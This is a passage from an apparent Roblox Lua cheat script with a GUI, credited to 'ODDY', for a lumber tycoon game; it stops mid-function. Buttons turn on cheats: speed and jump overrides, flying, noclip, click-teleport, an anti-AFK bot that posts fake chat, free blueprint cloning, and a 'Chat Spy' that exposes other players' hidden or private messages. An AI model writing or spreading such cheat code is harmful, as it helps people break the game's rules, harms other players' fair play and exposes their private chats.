+AIntroImage1.BorderSizePixel = 0
+AIntroImage1.Position = UDim2.new(0, 30, 0, 370)
+AIntroImage1.Size = UDim2.new(0, 120, 0, 120)
+AIntroImage1.Image = "rbxassetid://3940167130"
+AIntroImage1.Visible = true
+
+AIntroImage2.Name = "IntroImage"
+AIntroImage2.Parent = MainFrame
+AIntroImage2.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+AIntroImage2.BackgroundTransparency = 1
+AIntroImage2.BorderColor3 = Color3.new(1, 1, 1)
+AIntroImage2.BorderSizePixel = 0
+AIntroImage2.Position = UDim2.new(0, 220, 0, 390)
+AIntroImage2.Size = UDim2.new(0, 60, 0, 100)
+AIntroImage2.Image = "rbxassetid://4910802321"
+AIntroImage2.Visible = true
+
+
+AIntroImage3.Name = "IntroImage"
+AIntroImage3.Parent = MainFrame
+AIntroImage3.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+AIntroImage3.BackgroundTransparency = 1
+AIntroImage3.BorderColor3 = Color3.new(1, 1, 1)
+AIntroImage3.BorderSizePixel = 0
+AIntroImage3.Position = UDim2.new(0, 285, 0, 390)
+AIntroImage3.Size = UDim2.new(0, 60, 0, 100)
+AIntroImage3.Image = "rbxassetid://4910802958"
+AIntroImage3.Visible = true
+
+BloodFrameInfo.Name = "BloodFrameInfo"
+BloodFrameInfo.Parent = MenuFrame
+BloodFrameInfo.BackgroundColor3 = Color3.new(0, 0, 0)
+BloodFrameInfo.BackgroundTransparency = 0.3
+BloodFrameInfo.Position = UDim2.new(0, 3, 0, 3)
+BloodFrameInfo.Size = UDim2.new(0, 164, 0, 290)
+BloodFrameInfo.Font = Enum.Font.Fantasy
+BloodFrameInfo.Text = "Made By\nODDY\n\nFIX WayPoints added new Scripts.\nRemoved all patched Scipts.\nChange the look of gui.\nAuto Buy Ports Items to Base\nA BIG THANKS TO KINGADASOUTH AND JOHIRO FOR WORKING ON THE NEW SCRIPTS.\n\nScripts may LAG and big so give time to load."
+BloodFrameInfo.TextColor3 = Color3.fromRGB(245, 205, 48)
+BloodFrameInfo.TextWrapped = true
+BloodFrameInfo.TextSize = 14
+BloodFrameInfo.Visible = true
+
+Depart.Name = "Depart"
+Depart.Parent = MainFrame
+Depart.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+Depart.BorderColor3 = Color3.new(0, 0, 0)
+Depart.BorderSizePixel = 2
+Depart.Position = UDim2.new(0, 50, 0, 5)
+Depart.Size = UDim2.new(0, 130, 0, 20)
+Depart.BackgroundTransparency=1
+Depart.Font = Enum.Font.Fantasy
+Depart.FontSize = Enum.FontSize.Size18
+Depart.Text = "Ferry Departs: 0"
+Depart.TextColor3 = Color3.new(0, 1, 0)
+Depart.TextSize = 15
+Depart.TextStrokeColor3 = Color3.new(1, 1, 1)
+Depart.TextWrapped = true
+
+game.Workspace.Ferry.TimeToDeparture.Changed:connect(function()
+Depart.Text = "Ferry Departs: ".. game.Workspace.Ferry.TimeToDeparture.Value
+if Depart.Text == "Ferry Departs: 0" then 
+	wait(6)
+	Depart.Text = "Ferry has Departed"
+else
+	Depart.Text = "Ferry Departs: ".. game.Workspace.Ferry.TimeToDeparture.Value
+end
+end)
+
+ChangeItem.Name = "ChangeItem"
+ChangeItem.Parent = MainFrame
+ChangeItem.BackgroundColor3 = Color3.fromRGB(193, 40, 28)
+ChangeItem.BorderColor3 = Color3.new(0, 0, 0)
+ChangeItem.BorderSizePixel = 2
+ChangeItem.Position = UDim2.new(0, 390, 1, -110)
+ChangeItem.Size = UDim2.new(0, 100, 0, 100)
+ChangeItem.ZIndex = 2
+
+CurrentItem.Name = "CurrentItem"
+CurrentItem.Parent = ChangeItem
+CurrentItem.BackgroundColor3 = Color3.new(1, 1, 1)
+CurrentItem.BorderColor3 = Color3.new(0, 0, 0)
+CurrentItem.BorderSizePixel = 2
+CurrentItem.Position = UDim2.new(0, 10, 0, 10)
+CurrentItem.Size = UDim2.new(0, 80, 0, 80)
+CurrentItem.ZIndex = 2
+CurrentItem.Image = "rbxassetid://3886256996"
+CurrentItem.ScaleType = Enum.ScaleType.Crop
+
+Picker.Name = "Picker"
+Picker.Parent = MainFrame
+Picker.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Picker.BorderColor3 = Color3.new(0, 0, 0)
+Picker.BorderSizePixel = 2
+Picker.Position = UDim2.new(0, 390, 1, -460)
+Picker.Size = UDim2.new(0, 100, 0, 345)
+Picker.CanvasPosition = Vector2.new(0,0)
+Picker.CanvasSize = UDim2.new(0, 0, 0, 772)
+Picker.ScrollBarThickness = 10
+Picker.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
+Picker.Visible = true
+
+ctheme.Name = "ctheme"
+ctheme.Parent = MainFrame
+ctheme.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+ctheme.BorderColor3 = Color3.new(0, 0, 0)
+ctheme.BorderSizePixel = 2
+ctheme.Position = UDim2.new(0, 170, 0, 5)
+ctheme.Size = UDim2.new(0, 130, 0, 20)
+ctheme.BackgroundTransparency=1
+ctheme.Font = Enum.Font.Fantasy
+ctheme.FontSize = Enum.FontSize.Size18
+ctheme.Text = "DARK BLOOD"
+ctheme.TextColor3 = Color3.new(0, 0, 1)
+ctheme.TextSize = 15
+ctheme.TextStrokeColor3 = Color3.new(1, 1, 1)
+ctheme.TextWrapped = true
+ctheme.MouseButton1Down:connect(function()
+ImageLabel.Image = "rbxassetid://4501090530"
+BloodFrameInfo.TextColor3 = Color3.new(1, 1, 1)
+MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Picker.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+PlayerFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Waypoints.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Woodrus.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Furniture1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+LogicStore.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+end)
+
+ctheme1.Name = "ctheme"
+ctheme1.Parent = MainFrame
+ctheme1.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+ctheme1.BorderColor3 = Color3.new(0, 0, 0)
+ctheme1.BorderSizePixel = 2
+ctheme1.Position = UDim2.new(0, 275, 0, 5)
+ctheme1.Size = UDim2.new(0, 130, 0, 20)
+ctheme1.BackgroundTransparency=1
+ctheme1.Font = Enum.Font.Fantasy
+ctheme1.FontSize = Enum.FontSize.Size18
+ctheme1.Text = "DARK XMAS"
+ctheme1.TextColor3 = Color3.new(0, 0, 1)
+ctheme1.TextSize = 15
+ctheme1.TextStrokeColor3 = Color3.new(0, 0, 1)
+ctheme1.TextWrapped = true
+ctheme1.MouseButton1Down:connect(function()
+ImageLabel.Image = "rbxassetid://4501461226"
+BloodFrameInfo.TextColor3 = Color3.new(1, 1, 1)
+MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Picker.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+PlayerFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Waypoints.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Woodrus.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Furniture1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+LogicStore.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+end)
+
+ctheme2.Name = "ctheme"
+ctheme2.Parent = MainFrame
+ctheme2.BackgroundColor3 = Color3.new(0, 0.298039, 0.498039)
+ctheme2.BorderColor3 = Color3.new(0, 0, 0)
+ctheme2.BorderSizePixel = 2
+ctheme2.Position = UDim2.new(0, 360, 0, 5)
+ctheme2.Size = UDim2.new(0, 130, 0, 20)
+ctheme2.BackgroundTransparency=1
+ctheme2.Font = Enum.Font.Fantasy
+ctheme2.FontSize = Enum.FontSize.Size18
+ctheme2.Text = "RED XMAS"
+ctheme2.TextColor3 = Color3.new(0, 0, 1)
+ctheme2.TextSize = 15
+ctheme2.TextStrokeColor3 = Color3.new(1, 1, 1)
+ctheme2.TextWrapped = true
+ctheme2.MouseButton1Down:connect(function()
+ImageLabel.Image = "rbxassetid://4501461429"
+BloodFrameInfo.TextColor3 = Color3.new(1, 1, 1)
+MenuFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Picker.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+PlayerFrame.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Waypoints.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Woodrus.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+Furniture1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+BobsCarPics.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+LogicStore.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 1, 0)
+end)
+
+Player.Name = "Player"
+Player.Parent = Picker
+Player.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Player.BorderColor3 = Color3.new(0, 0, 0)
+Player.Position = UDim2.new(0, 15, 0, 5)
+Player.Size = UDim2.new(0, 80, 0, 80)
+Player.ZIndex = 3
+Player.Image = "rbxassetid://4892950869"
+Player.ScaleType = Enum.ScaleType.Crop
+Player.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892950869"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+TimesFrame.Visible = true
+
+end)
+
+PlayerFrame.Name = "PlayerFrame"
+PlayerFrame.Parent = MenuFrame
+PlayerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+PlayerFrame.BackgroundTransparency = 0.5
+PlayerFrame.BorderColor3 = Color3.new(0, 0, 0)
+PlayerFrame.Size = UDim2.new(0, 378, 0, 460)
+PlayerFrame.Visible = false
+
+PlayerTitle.Name = "PlayerTitle"
+PlayerTitle.Parent = PlayerFrame
+PlayerTitle.BackgroundColor3 = Color3.new(1, 0, 0)
+PlayerTitle.BackgroundTransparency = 0.10000000149012
+PlayerTitle.BorderColor3 = Color3.new(1, 0, 0)
+PlayerTitle.Position = UDim2.new(0, 5, 0, 5)
+PlayerTitle.Size = UDim2.new(0, 160, 0, 20)
+PlayerTitle.Font = Enum.Font.Fantasy
+PlayerTitle.Text = "Player Tools"
+PlayerTitle.TextColor3 = Color3.new(1, 1, 1)
+PlayerTitle.TextSize = 14
+
+WalkspeedLabel.Name = "WalkspeedLabel"
+WalkspeedLabel.Parent = PlayerFrame
+WalkspeedLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+WalkspeedLabel.BackgroundTransparency = 0.6
+WalkspeedLabel.BorderColor3 = Color3.new(1, 0, 0)
+WalkspeedLabel.Position = UDim2.new(0, 3, 0, 28)
+WalkspeedLabel.Size = UDim2.new(0, 140, 0, 20)
+WalkspeedLabel.Font = Enum.Font.Fantasy
+WalkspeedLabel.Text = "Walkspeed"
+WalkspeedLabel.TextColor3 = Color3.new(1, 1, 1)
+WalkspeedLabel.TextSize = 14
+
+WalkSpeed.Name = "WalkSpeed"
+WalkSpeed.Parent = PlayerFrame
+WalkSpeed.BackgroundColor3 = Color3.new(0, 0, 0)
+WalkSpeed.BorderColor3 = Color3.new(1, 0, 0)
+WalkSpeed.BackgroundTransparency = 0.6
+WalkSpeed.Position = UDim2.new(0, 147, 0, 28)
+WalkSpeed.Size = UDim2.new(0, 21, 0, 20)
+WalkSpeed.Font = Enum.Font.Fantasy
+WalkSpeed.Text = "V"
+WalkSpeed.TextColor3 = Color3.new(1, 1, 1)
+WalkSpeed.TextSize = 14
+
+WalkspeedLabel.MouseButton1Down:connect(function()
+	 local walkspeedplayer = game:GetService("Players").LocalPlayer
+    local walkspeedmouse = walkspeedplayer:GetMouse()
+    
+    local walkspeedenabled = false
+    
+  function x_walkspeed(key)
+        if (key == "v") then
+            if walkspeedenabled == false then
+                 _G.WS = 150;
+
+                local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
+                Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
+                Humanoid.WalkSpeed = _G.WS;
+                end)
+                Humanoid.WalkSpeed = _G.WS;
+                
+                walkspeedenabled = true
+            elseif walkspeedenabled == true then
+                _G.WS = 15;
+                local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
+                Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
+                Humanoid.WalkSpeed = _G.WS;
+                end)
+                Humanoid.WalkSpeed = _G.WS;
+                
+                walkspeedenabled = false
+            end
+        end
+    end
+    
+    walkspeedmouse.KeyDown:connect(x_walkspeed)
+
+end)
+
+JumpText.Name = "JumpText"
+JumpText.Parent = PlayerFrame
+JumpText.BackgroundColor3 = Color3.new(0, 0, 0)
+JumpText.BackgroundTransparency = 0.6
+JumpText.BorderColor3 = Color3.new(1, 0, 0)
+JumpText.Position = UDim2.new(0, 147, 0, 51)
+JumpText.Size = UDim2.new(0, 21, 0, 20)
+JumpText.Font = Enum.Font.Fantasy
+JumpText.Text = "50"
+JumpText.TextColor3 = Color3.new(1, 1, 1)
+JumpText.TextSize = 14
+
+JumpPower.Name = "JumpPowerLabel"
+JumpPower.Parent = PlayerFrame
+JumpPower.BackgroundColor3 = Color3.new(0, 0, 0)
+JumpPower.BackgroundTransparency = 0.6
+JumpPower.BorderColor3 = Color3.new(1, 0, 0)
+JumpPower.Position = UDim2.new(0, 3, 0, 51)
+JumpPower.Size = UDim2.new(0, 140, 0, 20)
+JumpPower.Font = Enum.Font.Fantasy
+JumpPower.Text = "Jump Power"
+JumpPower.TextColor3 = Color3.new(1, 1, 1)
+JumpPower.TextSize = 14
+
+player = game.Players.LocalPlayer
+Jump = 50
+
+JumpPower.MouseButton1Down:connect(function()
+Jump = JumpText.Text
+end)
+
+player.Character.Humanoid.JumpPower = Jump
+
+player.Character.Humanoid.Changed:connect(function()
+player.Character.Humanoid.JumpPower = Jump
+
+end)
+
+FlyOn.Name = "FlyOn"
+FlyOn.Parent = PlayerFrame
+FlyOn.BackgroundColor3 = Color3.new(0, 0, 0)
+FlyOn.BackgroundTransparency = 0.6
+FlyOn.BorderColor3 = Color3.new(1, 0, 0)
+FlyOn.Position = UDim2.new(0, 3, 0, 74)
+FlyOn.Size = UDim2.new(0, 80, 0, 20)
+FlyOn.Font = Enum.Font.Fantasy
+FlyOn.Text = "Fly On"
+FlyOn.TextColor3 = Color3.new(1, 1, 1)
+FlyOn.TextSize = 14
+
+FlyOff.Name = "FlyOff"
+FlyOff.Parent = PlayerFrame
+FlyOff.BackgroundColor3 = Color3.new(0, 0, 0)
+FlyOff.BackgroundTransparency = 0.6
+FlyOff.BorderColor3 = Color3.new(1, 0, 0)
+FlyOff.BorderSizePixel = 0
+FlyOff.Position = UDim2.new(0, 86, 0, 74)
+FlyOff.Size = UDim2.new(0, 83, 0, 20)
+FlyOff.Font = Enum.Font.Fantasy
+FlyOff.Text = "Fly Off"
+FlyOff.TextColor3 = Color3.new(1, 1, 1)
+FlyOff.TextSize = 14
+
+FlyOn.MouseButton1Click:connect(function()
+	Fly = true
+  local mouse=game.Players.LocalPlayer:GetMouse''
+  localplayer=game.Players.LocalPlayer
+  game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+  local torso = game.Players.LocalPlayer.Character.HumanoidRootPart
+  local speed=0
+  local keys={a=false,d=false,w=false,s=false} 
+  local e1
+  local e2
+  local function start()
+   local pos = Instance.new("BodyPosition",torso)
+   local gyro = Instance.new("BodyGyro",torso)
+   pos.Name="EPIXPOS"
+   pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+   pos.position = torso.Position
+   gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+   gyro.cframe = torso.CFrame
+   repeat
+    wait()
+    localplayer.Character.Humanoid.PlatformStand=true
+    local new=gyro.cframe - gyro.cframe.p + pos.position
+    if not keys.w and not keys.s and not keys.a and not keys.d then
+     speed=1
+    end 
+    if keys.w then 
+     new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+     speed=speed+0.02
+    end
+    if keys.s then 
+     new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+     speed=speed+0.02
+    end
+    if keys.d then 
+     new = new * CFrame.new(speed,0,0)
+     speed=speed+0.02
+    end
+    if keys.a then 
+     new = new * CFrame.new(-speed,0,0)
+     speed=speed+0.02
+    end
+    if speed>5 then
+     speed=5.5
+    end
+    pos.position=new.p
+    if keys.w then
+     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*15),0,0)
+    elseif keys.s then
+     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*15),0,0)
+    else
+     gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+    end
+   until not Fly
+   if gyro then gyro:Destroy() end
+   if pos then pos:Destroy() end
+   flying=false
+   localplayer.Character.Humanoid.PlatformStand=false
+   speed=0
+  end
+  e1=mouse.KeyDown:connect(function(key)
+   if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
+   if key=="w" then
+    keys.w=true
+   elseif key=="s" then
+    keys.s=true
+   elseif key=="a" then
+    keys.a=true
+   elseif key=="d" then
+    keys.d=true
+   end
+  end)
+  e2=mouse.KeyUp:connect(function(key)
+   if key=="w" then
+    keys.w=false
+   elseif key=="s" then
+    keys.s=false
+   elseif key=="a" then
+    keys.a=false
+   elseif key=="d" then
+    keys.d=false
+   end
+  end)
+  start()
+end)
+
+FlyOff.MouseButton1Click:connect(function()
+	Fly = false
+end)
+
+Noclip.Name = "SetPosition"
+Noclip.Parent = PlayerFrame
+Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
+Noclip.BackgroundTransparency = 0.69999998807907
+Noclip.BorderColor3 = Color3.new(1, 0, 0)
+Noclip.Position = UDim2.new(0, 5, 0, 97)
+Noclip.Size = UDim2.new(0, 80, 0, 20)
+Noclip.Font = Enum.Font.Fantasy
+Noclip.Text = "Noclip"
+Noclip.TextColor3 = Color3.new(1, 1, 1)
+Noclip.TextSize = 14
+noclip = false
+game:GetService('RunService').Stepped:connect(function()
+if noclip then
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+Noclip.BackgroundColor3 = Color3.fromRGB(91, 154, 76)
+--Noclip.TextColor3 = Color3.new(0, 1, 0)
+Noclip.Text = "No Clip On"
+end
+end)
+Noclip.MouseButton1Down:connect(function()
+noclip = not noclip
+Noclip.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+--Noclip.TextColor3 = Color3.new(0.7, 0, 0)
+Noclip.Text = "No Clip Off"
+end)
+
+ClickTP.Name = "ClickTP"
+ClickTP.Parent = PlayerFrame
+ClickTP.BackgroundColor3 = Color3.new(0, 0, 0)
+ClickTP.BackgroundTransparency = 0.69999998807907
+ClickTP.BorderColor3 = Color3.new(1, 0, 0)
+ClickTP.Position = UDim2.new(0, 86, 0, 97)
+ClickTP.Size = UDim2.new(0, 83, 0, 20)
+ClickTP.Font = Enum.Font.Fantasy
+ClickTP.Text = "ClickTP"
+ClickTP.TextColor3 = Color3.new(1, 1, 1)
+ClickTP.TextSize = 14
+ClickTP.MouseButton1Click:Connect(function()
+    mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Click Teleport"
+tool.Activated:connect(function()
+local pos = mouse.Hit+Vector3.new(0,2.5,0)
+pos = CFrame.new(pos.X,pos.Y,pos.Z)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+
+AntiAFKtime.Name = "AntiAFKtime"
+AntiAFKtime.Parent = PlayerFrame
+AntiAFKtime.BackgroundColor3 = Color3.new(0, 0, 0)
+AntiAFKtime.BackgroundTransparency = 0.69999998807907
+AntiAFKtime.BorderColor3 = Color3.new(1, 0, 0)
+AntiAFKtime.Position =  UDim2.new(0, 3, 0, 120)
+AntiAFKtime.Size = UDim2.new(0, 165, 0, 20)
+AntiAFKtime.Font = Enum.Font.Fantasy
+AntiAFKtime.Text = "AFK for: 0 Seconds"
+AntiAFKtime.TextColor3 = Color3.new(0, 1, 0)
+AntiAFKtime.TextSize = 14
+
+
+AntiAFK.Name = "AntiAFK"
+AntiAFK.Parent = PlayerFrame
+AntiAFK.BackgroundColor3 = Color3.new(0, 0, 0)
+AntiAFK.BackgroundTransparency = 0.69999998807907
+AntiAFK.BorderColor3 = Color3.new(1, 0, 0)
+AntiAFK.Position =  UDim2.new(0, 3, 0, 143)
+AntiAFK.Size = UDim2.new(0, 165, 0, 20)
+AntiAFK.Font = Enum.Font.Fantasy
+AntiAFK.Text = "Start Anti-AFK Mode"
+AntiAFK.TextColor3 = Color3.new(0, 1, 0)
+AntiAFK.TextSize = 14
+AntiAFK.MouseButton1Down:Connect(function()
+  makesound("rbxassetid://156785206")
+    if afkactive == true then
+        afkactive = false
+		AntiAFK.BackgroundColor3 = Color3.new(0, 0, 0)
+                                          AntiAFKtime.TextColor3 = Color3.new(0, 1, 0)
+		AntiAFK.Text = "Start Anti-AFK Mode"
+    elseif afkactive == false then
+        afkactive = true
+		AntiAFK.BackgroundColor3 = Color3.new(0, 0, 0)
+		AntiAFKtime.TextColor3 = Color3.new(255, 0, 0)
+		AntiAFK.Text = "Stop Anti-AFK Mode"
+
+        logtime = coroutine.wrap(function()
+			afktotaltime=0
+			while afkactive == true do
+				wait(1)
+				afktotaltime=afktotaltime+1
+				AntiAFKtime.Text = "AFK for: "..afktotaltime.." Seconds"
+			end
+		end)
+	
+        messageBot = coroutine.wrap(function()
+			while afkactive == true do
+				wait(900)
+				possiblechats = {"afk", "brb", "I'm AFK"}
+				decide=math.random(1,#possiblechats)
+				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(possiblechats[decide], "All")
+				game.Players:Chat("/e point")
+			end
+		end)
+		
+	    moveChar = coroutine.wrap(function()
+			plr = game:service'Players'.LocalPlayer
+			char = plr.Character
+			hum = char:FindFirstChildOfClass'Humanoid'
+            while afkactive==true do
+				wait(1)
+				hum:Move(Vector3.new(1, 0, 0), false)
+				wait(1)
+				hum:Move(Vector3.new(-1, 0, 0), false)
+				wait(1)
+				hum:Move(Vector3.new(1, 0, 0), false)
+				wait(1)
+				hum:Move(Vector3.new(-1, 0, 0), false)
+				wait(1)
+				hum:Move(Vector3.new(0, 1, 0), false)
+				wait(1)
+				hum:Move(Vector3.new(0, 1, 0), false)
+				wait(60)
+			end
+        end)
+	
+        logtime()
+        moveChar()
+        messageBot()
+
+	end
+end)
+
+ChatSpy.Name = "ChatSpy"
+ChatSpy.Parent = PlayerFrame
+ChatSpy.BackgroundColor3 = Color3.new(0, 0, 0)
+ChatSpy.BackgroundTransparency = 0.69999998807907
+ChatSpy.BorderColor3 = Color3.new(1, 0, 0)
+ChatSpy.Position =  UDim2.new(0, 3, 0, 166)
+ChatSpy.Size = UDim2.new(0, 165, 0, 20)
+ChatSpy.Font = Enum.Font.Fantasy
+ChatSpy.Text = "Chat Spy"
+ChatSpy.TextColor3 = Color3.new(1, 1, 1)
+ChatSpy.TextSize = 14
+ChatSpy.MouseButton1Down:connect(function()
+--This script reveals ALL hidden messages in the default chat
+--chat "/spy" to toggle!
+enabled = true
+--if true will check your messages too
+spyOnMyself = true
+--if true will chat the logs publicly (fun, risky)
+public = false
+--if true will use /me to stand out
+publicItalics = true
+--customize private logs
+privateProperties = {
+	Color = Color3.fromRGB(0,255,255); 
+	Font = Enum.Font.SourceSansBold;
+	TextSize = 18;
+}
+--////////////////////////////////////////////////////////////////
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+local instance = (_G.chatSpyInstance or 0) + 1
+_G.chatSpyInstance = instance
+
+local function onChatted(p,msg)
+	if _G.chatSpyInstance == instance then
+		if p==player and msg:lower():sub(1,4)=="/spy" then
+			enabled = not enabled
+			wait(0.3)
+			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+		elseif enabled and (spyOnMyself==true or p~=player) then
+			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+			local hidden = true
+			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+					hidden = false
+				end
+			end)
+			wait(1)
+			conn:Disconnect()
+			if hidden and enabled then
+				if public then
+					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+				else
+					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+				end
+			end
+		end
+	end
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end
+Players.PlayerAdded:Connect(function(p)
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end)
+privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+local chatFrame = player.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible = true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+
+end)
+
+
+Fog.Name = "Fog"
+Fog.Parent = PlayerFrame
+Fog.BackgroundColor3 = Color3.new(0, 0, 0)
+Fog.BackgroundTransparency = 0.69999998807907
+Fog.BorderColor3 = Color3.new(1, 0, 0)
+Fog.Position =  UDim2.new(0, 3, 0, 189)
+Fog.Size = UDim2.new(0, 165, 0, 20)
+Fog.Font = Enum.Font.Fantasy
+Fog.Text = "Remove Fog"
+Fog.TextColor3 = Color3.new(1, 1, 1)
+Fog.TextSize = 14
+Fog.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+	Fog.BackgroundColor3 = Color3.new(0, 0, 0)
+                      Fog.TextColor3 = Color3.new(0, 1, 0)
+game.Lighting.Changed:connect(function()
+	game.Lighting.TimeOfDay = "12:00:00"
+	game.Lighting.FogEnd = 9999
+	game.Lighting.Brightness = 2
+end)
+end)
+
+ReJoinServer.Name = "ReJoinServer"
+ReJoinServer.Parent = PlayerFrame
+ReJoinServer.BackgroundColor3 = Color3.new(0, 0, 0)
+ReJoinServer.BackgroundTransparency = 0.69999998807907
+ReJoinServer.BorderColor3 = Color3.new(1, 0, 0)
+ReJoinServer.Position =  UDim2.new(0, 3, 0, 212)
+ReJoinServer.Size = UDim2.new(0, 165, 0, 20)
+ReJoinServer.Font = Enum.Font.Fantasy
+ReJoinServer.Text = "ReJoin Server"
+ReJoinServer.TextColor3 = Color3.new(1, 1, 1)
+ReJoinServer.TextSize = 14
+ReJoinServer.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+	local placeId = "13822889"
+	game:GetService("TeleportService"):Teleport(placeId)
+end)
+
+Reset.Name = "Reset"
+Reset.Parent = PlayerFrame
+Reset.BackgroundColor3 = Color3.new(0, 0, 0)
+Reset.BackgroundTransparency = 0.69999998807907
+Reset.BorderColor3 = Color3.new(1, 0, 0)
+Reset.Position =  UDim2.new(0, 3, 0, 235)
+Reset.Size = UDim2.new(0, 165, 0, 20)
+Reset.Font = Enum.Font.Fantasy
+Reset.Text = "Reset Character"
+Reset.TextColor3 = Color3.new(1, 1, 1)
+Reset.TextSize = 14
+Reset.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+	game.Players.LocalPlayer.Character.Head:Destroy()
+end)
+
+Base1Title.Name = "Base1Title"
+Base1Title.Parent = PlayerFrame
+Base1Title.BackgroundColor3 = Color3.new(1, 0, 0)
+Base1Title.BackgroundTransparency = 0.10000000149012
+Base1Title.BorderSizePixel = 0
+Base1Title.Position = UDim2.new(0, 200, 0, 150)
+Base1Title.Size = UDim2.new(0, 160, 0, 20)
+Base1Title.Font = Enum.Font.Fantasy
+Base1Title.Text = "Base Tools"
+Base1Title.TextColor3 = Color3.new(1, 1, 1)
+Base1Title.TextSize = 14
+
+BluePrints.Name = "BluePrints"
+BluePrints.Parent = PlayerFrame
+BluePrints.BackgroundColor3 = Color3.new(0, 0, 0)
+BluePrints.BackgroundTransparency = 0.69999998807907
+BluePrints.BorderColor3 = Color3.new(1, 0, 0)
+BluePrints.Position = UDim2.new(0, 200, 0, 173)
+BluePrints.Size = UDim2.new(0, 160, 0, 20)
+BluePrints.Font = Enum.Font.Fantasy
+BluePrints.Text = "BluePrints"
+BluePrints.TextColor3 = Color3.new(1, 1, 1)
+BluePrints.TextSize = 14
+BluePrints.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
+local clone = v:Clone()
